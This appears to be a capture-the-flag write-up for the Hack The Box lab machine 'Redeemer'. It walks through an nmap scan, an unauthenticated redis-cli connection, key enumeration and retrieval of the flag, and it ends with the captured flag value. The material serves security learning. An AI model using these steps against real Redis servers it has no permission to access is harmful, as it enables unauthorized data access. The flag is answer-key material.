Redeemer
Given IP: 10.129.8.106

1) Connected via OpenVPN and started the VM instance. Noted the target machine IP address.
2) Let's start with a nmap scan to enumerate any open ports:
      nmap -sS -sV -p- -T4 -A 10.129.8.106 -vv
   6379/tcp (redis) was discovered.
3) Redit is an open-source NoSQL database. A quick search engine query seems to suggest that the easiest method for further discovery is using the redit command-line toolset.
      sudo apt install redis-tools
      man redis-cli #Note: this was near useless
      redis-cli --help
4) Looking through the help documentation, let's try unauthenticated connection with:
      redis-cli -h 10.129.8.106
   That worked.
5) Through some trial and error, info and select look promising. db0 exists, so we use:
      SELECT 0
      KEYS *
   The flag key looks interesting
      GET flag

Flag: HTB{03e1d2b376c37ab3f5319922053953eb}
